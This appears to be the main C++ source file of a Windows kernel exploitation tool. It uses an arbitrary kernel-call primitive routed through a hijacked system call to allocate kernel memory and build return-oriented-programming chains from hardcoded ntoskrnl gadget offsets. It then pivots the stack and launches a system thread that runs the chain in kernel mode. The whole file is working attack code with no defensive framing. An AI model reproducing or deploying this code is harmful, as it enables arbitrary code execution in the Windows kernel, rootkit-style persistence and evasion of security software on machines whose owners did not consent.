#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>
#include <include/stack/stack_manager.hpp>
#include <include/globals.hpp>

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    const std::uintptr_t RandomValidThreadAddress = Utils::FindRandomValidThreadAddress();
    if (!RandomValidThreadAddress)
    {
        std::exception("Failed to find a random valid thread address");
        return EXIT_FAILURE;
    }

    Globals::WindowsBuild = Utils::GetWindowsDisplayVersion();
    if (Globals::WindowsBuild.empty())
    {
        std::exception("Failed to find the windows build being used");
        return EXIT_FAILURE;
    }

    Globals::KernelBase = Driver::GetKernelModuleBase();
    if (!Globals::KernelBase)
    {
        std::exception("Failed to find ntoskrnl.exe base");
        return EXIT_FAILURE;
    }

    std::printf("[+] Windows build: %s\n", Globals::WindowsBuild.c_str());
    std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Globals::KernelBase);

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller("NtReadFileScatter");

    void* PivotDataAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x58, reinterpret_cast<void*>(MAXULONG64));
    void* DestinationStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
    void* SourceStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
    void* ObjectAttributeArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(OBJECT_ATTRIBUTES), reinterpret_cast<void*>(MAXULONG64));
    void* OutputHandleArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    void* MainStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
    void* InitStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
    Globals::DummyMemoryAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    Globals::CurrentStackOffsetAddress = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    Globals::StackLimitStoreAddress = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));

    std::printf("[+] Main Stack @ 0x%p\n", MainStackAllocation);
    std::printf("[+] Init Stack @ 0x%p\n", InitStackAllocation);
    std::printf("[+] Current Stack Offset @ 0x%p\n", Globals::CurrentStackOffsetAddress);

    if (!MainStackAllocation || !InitStackAllocation || !PivotDataAllocation || !Globals::CurrentStackOffsetAddress || !Globals::StackLimitStoreAddress)
        return EXIT_FAILURE;

    // Zero out stack allocation
    KernelCaller.Call<void*, void*, size_t>("RtlZeroMemory", MainStackAllocation, 0x6000);
    KernelCaller.Call<void*, void*, size_t>("RtlZeroMemory", InitStackAllocation, 0x6000);
    KernelCaller.Call<void*, void*, size_t>("RtlZeroMemory", Globals::CurrentStackOffsetAddress, 0x8);

    // Create usermode event
    const wchar_t* EventNameString = L"\\BaseNamedObjects\\Global\\MYSIGNALEVENT";
    HANDLE UmEvent = CreateEventW(NULL, FALSE, FALSE, L"Global\\MYSIGNALEVENT");
    std::printf("[+] Usermode event handle: %x\n", UmEvent);

    StackManager MainStackManager(Globals::KernelBase, (std::uintptr_t)MainStackAllocation + 0x2000, 0x2000);
    StackManager InitStackManager(Globals::KernelBase, (std::uintptr_t)InitStackAllocation + 0x2000, 0x2000);

    // Open handle to usermode event in the kernel
    InitStackManager.AddFunctionCall("RtlInitUnicodeString", (std::uint64_t)DestinationStringArg, (std::uint64_t)SourceStringArg);
    InitStackManager.AddFunctionCall("ZwOpenEvent", (std::uint64_t)OutputHandleArg, EVENT_MODIFY_STATE | SYNCHRONIZE, (std::uint64_t)ObjectAttributeArg);
    InitStackManager.PivotToNewStack(&MainStackManager);

    // set first arg
    MainStackManager.ReadIntoRcx((std::uint64_t)OutputHandleArg);
    // set second arg
    MainStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    MainStackManager.AddPadding(0x10);
    MainStackManager.AddValue(TRUE, "SecondArg");
    MainStackManager.AddPadding(0x8);
    // set third arg
    MainStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
    MainStackManager.AddValue(NULL, "ThirdArg");
    MainStackManager.AddPadding(0x28);
    MainStackManager.AddFunctionCall("ZwWaitForSingleObject");
    MainStackManager.LoopBack();

    OBJECT_ATTRIBUTES ObjectAttributesData;
    InitializeObjectAttributes(&ObjectAttributesData, (PUNICODE_STRING)DestinationStringArg, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    std::uint64_t CurrentStackOffsetStartValue = 0x2000;

    void* PivotJumpAddress = (void*)(Globals::KernelBase + 0x20043b);
    void* NewRspAddress = (void*)((uint64_t)InitStackAllocation + 0x2000);

    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uint64_t)PivotDataAllocation + 0x50), &PivotJumpAddress, sizeof(PivotJumpAddress));
    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uint64_t)PivotDataAllocation + 0x10), &NewRspAddress, sizeof(NewRspAddress));
    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", SourceStringArg, (void*)EventNameString, lstrlenW(EventNameString) * 2 + 2);
    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", Globals::CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uintptr_t)MainStackAllocation + 0x2000), MainStackManager.GetStackBuffer(), MainStackManager.GetStackSize());
    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uintptr_t)InitStackAllocation + 0x2000), InitStackManager.GetStackBuffer(), InitStackManager.GetStackSize());

    Sleep(500);
    std::cin.get();

    // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
    void* BootstrapGadget = (void*)(Globals::KernelBase + 0x698bd0);

    HANDLE KernelThreadHandle;
    NTSTATUS ThreadCreationStatus = KernelCaller.Call<NTSTATUS, PHANDLE, ULONG, OBJECT_ATTRIBUTES*, HANDLE, void*, void*, void*>(
        "PsCreateSystemThread",
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        BootstrapGadget,
        PivotDataAllocation
    );

    if (!NT_SUCCESS(ThreadCreationStatus))
    {
        std::printf("[-] PsCreateSystemThread failed with status: 0x%X\n", ThreadCreationStatus);
        return EXIT_FAILURE;
    }

    KernelCaller.Call<void*, HANDLE>("ZwClose", KernelThreadHandle);

    return EXIT_SUCCESS;
}